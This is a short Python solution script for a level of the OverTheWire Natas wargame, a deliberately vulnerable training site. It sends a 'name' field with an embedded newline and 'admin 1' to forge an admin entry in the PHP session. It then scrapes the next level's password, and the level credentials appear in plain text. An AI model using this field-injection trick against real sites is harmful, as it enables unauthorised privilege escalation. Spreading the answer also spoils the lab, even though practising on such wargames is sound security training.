#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

url = 'http://%s.natas.labs.overthewire.org/?debug' % username
data = {"name": "Dana \nadmin 1"}
jar = {"PHPSESSID": "guq2hlru8fefcti1hk2tqfo017"}

requests.post(url, auth=(username, password), data=data, cookies=jar)
response = requests.get(url, auth=(username, password), cookies=jar)
content = response.text

print(re.findall('Password: (.*)</pre', content)[0])
